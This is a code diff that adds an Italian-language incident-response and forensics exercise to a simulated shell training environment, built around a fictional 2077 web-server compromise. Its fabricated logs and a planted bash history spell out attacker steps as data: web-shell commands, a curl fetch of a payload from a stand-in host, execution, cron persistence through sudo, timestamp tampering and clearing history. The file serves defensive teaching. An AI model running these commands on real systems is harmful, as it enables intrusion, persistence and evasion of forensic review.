@@ -521,6 +521,7 @@ export function buildWorld(user: string, hint?: () => string | null): Shell {
   const shell = new Shell({ user, host: HOSTNAME, fs, net: createNetwork(), hint });
   addLab(shell);
   addShopAndMail(shell, home, mine);
+  addIncident(shell, home, mine);
   return shell;
 }
 
@@ -909,6 +910,161 @@ function addShopAndMail(sh: Shell, home: string, mine: { owner: string; group: s
       '2077-11-13 09:36:58 user=t.okafor POST https://arasaka.nc.pagamenti-sicuri.nc/fatture/login 302',
       '2077-11-13 09:37:00 user=t.okafor GET https://www.arasaka.nc/ 200',
       '2077-11-13 09:51:20 user=m.ruiz GET https://intranet.arasaka-logistics.nc/segnala 200',
+    ].join('\n') + '\n',
+    mine,
+  );
+}
+
+/** Capitolo 08 (gestione dell'incidente) e capitolo DF (analisi forense): il caso Kiroshi. */
+function addIncident(sh: Shell, home: string, mine: { owner: string; group: string }): void {
+  const fs = sh.fs;
+  const A = '198.51.100.23';
+  const day = '2077-11-14';
+  fs.writeFile(
+    `${home}/ir/allarme.txt`,
+    [
+      'SIEM - ALLARME #20771114-0031     gravità: ALTA',
+      `ora:        ${day} 02:31:07`,
+      'regola:     "Server web avvia connessione in uscita"',
+      'host:       web01.kiroshi.nc (10.30.0.10)',
+      'processo:   kworker   utente: www-data   pid: 31337',
+      `destinazione: ${A}:4444 (sync.kiroshi-cdn.nc)`,
+      'nota:       il server web non ha motivo di aprire connessioni verso Internet',
+    ].join('\n') + '\n',
+    mine,
+  );
+  const web = [
+    `${day} 01:58:02 web 10.30.0.77 GET / 200`,
+    `${day} 02:03:15 web 192.0.2.41 GET /prodotti 200`,
+    `${day} 02:09:41 web ${A} GET / 200`,
+    `${day} 02:10:02 web ${A} GET /profilo 200`,
+    `${day} 02:11:30 web ${A} GET /profilo/foto 200`,
+    `${day} 02:12:18 web ${A} POST /profilo/foto (avatar.php, 2.1 KB) 200`,
+    `${day} 02:13:05 web ${A} GET /uploads/avatar.php?cmd=id 200`,
+    `${day} 02:13:40 web ${A} GET /uploads/avatar.php?cmd=uname+-a 200`,
+    `${day} 02:14:22 web ${A} GET /uploads/avatar.php?cmd=curl+-s+-o+/tmp/sfondo_mare.jpg+https://files.pastebox.nc/k 200`,
+    `${day} 02:15:01 web ${A} GET /uploads/avatar.php?cmd=sh+/tmp/s.sh 200`,
+    `${day} 02:40:12 web 192.0.2.41 GET /prodotti/occhiali 200`,
+  ];
+  const auth = [
+    `${day} 01:00:01 auth CRON[1201]: pam_unix(cron:session): session opened for user root`,
+    `${day} 02:15:44 auth sudo: www-data : TTY=unknown ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /etc/cron.d/php-sess`,
+    `${day} 02:20:13 auth sshd[4410]: Failed password for root from ${A} port 50122 ssh2`,
+    `${day} 02:20:15 auth sshd[4410]: Failed password for root from ${A} port 50124 ssh2`,
+  ];
+  const proc = [
+    `${day} 02:14:23 proc user=www-data pid=30990 cmd=curl -s -o /tmp/sfondo_mare.jpg https://files.pastebox.nc/k`,
+    `${day} 02:15:02 proc user=www-data pid=31301 cmd=mkdir -p /tmp/.x`,
+    `${day} 02:15:03 proc user=www-data pid=31302 cmd=cp /tmp/sfondo_mare.jpg /tmp/.x/kworker`,
+    `${day} 02:15:10 proc user=www-data pid=31337 cmd=/tmp/.x/kworker`,
+    `${day} 02:15:44 proc user=root pid=31340 cmd=tee /etc/cron.d/php-sess (cron: */10 * * * * www-data /tmp/.x/kworker)`,
+    `${day} 02:15:50 proc user=root pid=31342 cmd=touch -d 2071-06-02 /etc/cron.d/php-sess`,
+    `${day} 02:31:07 proc user=www-data pid=31337 cmd=/tmp/.x/kworker net=connect ${A}:4444`,
+  ];
+  fs.writeFile(`${home}/ir/web.log`, web.join('\n') + '\n', mine);
+  fs.writeFile(`${home}/ir/auth.log`, auth.join('\n') + '\n', mine);
+  fs.writeFile(`${home}/ir/processi.log`, proc.join('\n') + '\n', mine);
+  fs.writeFile(
+    `${home}/ir/report.md`,
+    [
+      '# Report di incidente - web01.kiroshi.nc',
+      '',
+      '## Sintesi',
+      'Nella notte del 14/11 un attaccante ha preso il controllo del server web e installato un programma che comunicava con l\'esterno.',
+      '',
+      '## Cronologia',
+      '- 02:09 primo contatto',
+      '- 02:31 allarme SIEM',
+      '',
+      '## Causa',
+      '',
+      '',
+      '## Impatto',
+      '',
+      '## Azioni',
+      '- server isolato alle 02:44',
+      '',
+      '## Raccomandazioni',
+      '',
+    ].join('\n'),
+    mine,
+  );
+
+  // --- prove forensi
+  const disk = ['DISKIMG web01.kiroshi.nc /dev/sda (simulata)', 'settori 0-41943039', 'partizione 1: ext4 /', 'acquisita con write blocker, 2077-11-14 04:02'].join('\n') + '\n';
+  const diskB = disk.replace('settori 0-41943039', 'settori 0-41943038');
+  fs.writeFile(
+    `${home}/forense/custodia.txt`,
+    [
+      'CATENA DI CUSTODIA - Caso KIR-2077-014',
+      '',
+      'REPERTO 1: disco del server web01.kiroshi.nc',
+      '  2077-11-14 03:50  ritirato da: V. Rook (sala server Kiroshi), sigillo n. 0441',
+      '  2077-11-14 04:02  acquisito con write blocker da: N. Kaur, immagine disco.img',
+      `  SHA-256 originale: ${sha256(disk)}`,
+      '  2077-11-14 04:40  creata copia-a.img (N. Kaur)',
+      '  2077-11-14 04:41  creata copia-b.img (N. Kaur)',
+      '  2077-11-14 06:15  copie consegnate al laboratorio (firma: Nyx)',
+      '  originale conservato nella cassaforte 2, sigillo n. 0442',
+    ].join('\n') + '\n',
+    mine,
+  );
+  fs.writeFile(`${home}/forense/copie/copia-a.img`, disk, mine);
+  fs.writeFile(`${home}/forense/copie/copia-b.img`, diskB, mine);
+  const elf = [
+    '\u007fELF\u0002\u0001\u0001\u0000\u0000\u0000\u0000\u0000\u0002\u0000>\u0000',
+    '\u0001\u0000\u0000\u0000/lib64/ld-linux-x86-64.so.2\u0000\u0000libc.so.6',
+    '\u0000\u0004\u0000connect\u0000socket\u0000fork\u0000\u0000',
+    'nc-crawler v2.3\u0000\u0001\u0003\u0002',
+    'sync.kiroshi-cdn.nc\u0000\u0000:4444\u0000\u0000',
+    '/etc/cron.d/php-sess\u0000\u0000*/10 * * * *\u0000',
+    '\u0000\u0000/tmp/.x/kworker\u0000\u0002\u0001',
+    '\u0000\u0000GCC: (Ubuntu 11.4.0) 11.4.0\u0000',
+  ].join('\n');
+  const est = `${home}/forense/estratti`;
+  fs.writeFile(`${est}/sfondo_mare.jpg`, elf, mine);
+  fs.writeFile(`${est}/profilo_judy.jpg`, 'ÿØÿà\u0000\u0010JFIF\u0000\u0001\u0001\u0000\u0000\u0001', mine);
+  fs.writeFile(`${est}/listino_2077.pdf`, '%PDF-1.7\n1 0 obj << /Title (Listino Kiroshi 2077) >> endobj\n', mine);
+  fs.writeFile(`${est}/leggimi.txt`, 'Cartella degli upload del sito: foto profilo dei clienti.\n', mine);
+  fs.writeFile(
+    `${home}/forense/bollettino.txt`,
+    [
+      '# CERT di Night City - IOC condivisi, settimana 46/2077',
+      '# SHA-256                                                          FAMIGLIA        NOTE',
+      `${sha256('neonlocker sample 1')}  NeonLocker      ransomware, cifra con estensione .neon`,
+      `${sha256(elf)}  NightCrawler    backdoor Linux, persistenza via cron, C2 su porta 4444`,
+      `${sha256('glitchstealer build 7')}  GlitchStealer   furto di password dai browser`,
+    ].join('\n') + '\n',
+    mine,
+  );
+  fs.writeFile(
+    `${home}/forense/timeline.csv`,
+    [
+      '2077-11-14 02:15:44,B,root,/etc/cron.d/php-sess',
+      '2077-11-14 02:12:18,B,www-data,/var/www/html/uploads/avatar.php',
+      '2077-11-14 02:16:30,B,www-data,/tmp/.x/kworker.log',
+      '2077-11-13 23:10:00,M,www-data,/var/www/html/cache/index.tmp',
+      '2077-11-14 02:15:03,B,www-data,/tmp/.x/kworker',
+      '2071-06-02 10:00:00,M,root,/etc/cron.d/php-sess',
+      '2077-11-14 02:15:50,C,root,/etc/cron.d/php-sess',
+      '2077-11-14 02:14:23,B,www-data,/tmp/sfondo_mare.jpg',
+      '2077-11-14 02:31:07,A,www-data,/tmp/.x/kworker',
+      '2077-11-12 08:00:00,M,root,/etc/cron.d/logrotate',
+    ].join('\n') + '\n',
+    mine,
+  );
+  fs.writeFile(
+    `${home}/forense/www-data/.bash_history`,
+    [
+      'id',
+      'uname -a',
+      'cd /tmp',
+      'curl -s -o /tmp/sfondo_mare.jpg https://files.pastebox.nc/k',
+      'mkdir -p /tmp/.x && cp sfondo_mare.jpg /tmp/.x/kworker',
+      'chmod +x /tmp/.x/kworker && /tmp/.x/kworker &',
+      'echo "*/10 * * * * www-data /tmp/.x/kworker" | sudo tee /etc/cron.d/php-sess',
+      'sudo touch -d 2071-06-02 /etc/cron.d/php-sess',
+      'history -c',
     ].join('\n') + '\n',
     mine,
   );
